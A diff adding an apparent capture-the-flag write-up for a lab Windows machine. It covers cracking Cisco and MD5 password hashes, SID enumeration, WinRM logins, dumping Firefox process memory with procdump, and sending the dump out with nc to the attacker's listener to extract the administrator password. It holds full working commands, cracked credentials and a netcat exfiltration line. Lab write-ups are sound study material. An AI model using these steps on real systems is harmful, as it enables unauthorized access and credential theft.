@@ -1,0 +1,130 @@
+USER SHELL:
+
+First, we can download a file 'Attachment' on the 10.10.10.149/issues.php
+the page that we logged in as a guest from login page.
+
+the file's in 10.10.10.149/attachments/config.txt
+it's shows two username, three passwords:
+> enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
+> username rout3r password 7 0242114B0E143F015F5D1E161713
+> username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
+
+the password 7 can be easily cracked online, 
+rout3r:$uperP@ssword
+admin:Q4)sJu\Y8qz*A3?d
+
+and the third one must using john the ripper to cracked.
+List the hash $1$pdQG$o8nrSzsGXeaduXrjlvKc91  in crack.txt then, 
+> john --wordlist=/root/rockyou.txt crack.txt
+> john --show crack.txt
+found out creds : ?:stealth1agent
+
+Then, we using those three to enumming ther user
+
+we can get a user list by using lookupsid.py:
+>  lookupsid.py hazard:stealth1agent@10.10.10.149
+the userlist we got :
+[*] Brute forcing SIDs at 10.10.10.149
+[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+500: SUPPORTDESK\Administrator (SidTypeUser)
+501: SUPPORTDESK\Guest (SidTypeUser)
+503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+513: SUPPORTDESK\None (SidTypeGroup)
+1008: SUPPORTDESK\Hazard (SidTypeUser)
+1009: SUPPORTDESK\support (SidTypeUser)
+1012: SUPPORTDESK\Chase (SidTypeUser)
+1013: SUPPORTDESK\Jason (SidTypeUser)
+
+
+Then, we can try to login using win-rm by the combo of those users and passwords.
+End up we found a creds that could login to user shell:
+Chase:Q4)sJu\Y8qz*A3?d
+> evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
+
+end user part.
+
+===========================================================================================
+
+Root Shell:
+
+After loggin in as Chase, we enum but found nothing but a process names firefox.
+It seems root user is browsing the firefox and have logged in in broswer 
+
+you can check that out by 
+> get-process
+you'll see four firefox process in it.
+
+here's the example :
+
+============= start of example ======================================
+*Evil-WinRM* PS C:\Users\Chase\Documents> get-process
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                                    
+-------  ------    -----      -----     ------     --  -- -----------                                                                                                                                                                                    
+    124       6     2760       4688       0.05   1248   0 cmd                                                                                                                                                                                            
+    128       7     2620       4592       0.03   3204   0 cmd                                                                                                                                                                                            
+    113       5     2288       3780       0.06   5288   0 cmd                                                                                                                                                                                            
+     85       5     2292       3780       0.02   5388   0 cmd                                                                                                                                                                                            
+    125       5     2284       3780       0.02   6660   0 cmd                                                                                                                                                                                            
+    149       9     6672      12272       1.27    308   0 conhost                                                                                                                                                                                        
+    147       9     6636       2052              1436   0 conhost                                                                                                                                                                                        
+    152       9     6680      12300       0.81   1476   0 conhost                                                                                                                                                                                        
+    151      10     6684      12284       1.11   1528   0 conhost                                                                                                                                                                                        
+    148       9     6684      12308       0.34   1720   0 conhost                                                                                                                                                                                        
+    149       9     6688      12312       1.25   4648   0 conhost                                                                                                                                                                                        
+    149       9     6644      12256       1.86   5844   0 conhost                                                                                                                                                                                        
+    150      10     6696      12284       3.48   6776   0 conhost                                                                                                                                                                                        
+    672      28     2288       5172               404   0 csrss                                                                                                                                                                                          
+    287      17     2248       4680               496   1 csrss                                                                                                                                                                                          
+    360      15     3560      14220              5140   1 ctfmon                                                                                                                                                                                         
+    258      14     4144      13260              3920   0 dllhost                                                                                                                                                                                        
+    166       9     1892       9808       0.17   7112   1 dllhost                                                                                                                                                                                        
+    617      32    33196      58816                80   1 dwm                                                                                                                                                                                            
+   1494      57    23424      78548              5576   1 explorer                                                                                                                                                                                       
+    358      26    16392      37604       0.42    740   1 firefox                                                                                                                                                                                        
+    390      30    27516      59536      10.78   6524   1 firefox                                                                                                                                                                                        
+   1229      68   111972     446152      25.84   6676   1 firefox                                                                                                                                                                                        
+    343      19    10032      37500       0.58   6800   1 firefox                                                                                                                                                                                        
+    407      31    17436      63368       1.08   7032   1 firefox
+
+==========  end of example =====================================
+
+
+now, uploading the procdump to dump the process.
+> upload /root/web/Procdump/procdump64.exe C:\Users\Chase\Documents
+
+also the nc.exe to download the dumped file we created.
+> upload /usr/share/windows-resources/binaries/nc.exe C:\Users\Chase\Documents
+
+start to dump process, remember dump the most used CPU one.
+> .\procdump64.exe -accepteula <PID>
+
+then you'll get something like this: firefox.exe_191029_151016.dmp ( or you can rename the file is ok. )
+
+using nc.exe to download it.
+( using cmd /c tell that the commands should run as cmd not Powershell )
+remote side:
+> cmd /c ".\nc.exe 10.10.14.34 7777 < firefox.exe_191029_151016.dmp"
+
+my kali side:
+> nc -lvp 7777 > final.dmp
+
+
+
+Then you'll get the dump file.
+
+Next, using strings to peek the creds inside.
+> strings final.dmp | grep password
+
+You'll get something like this:
+"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
+( Of course the whole password relative strings is more than this  )
+
+
+
+Then, using the creds: administrator:4dD!5}x/re8]FBuZ to loging via evil-winrm
+> evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'
+
+That's the end of root part :D !
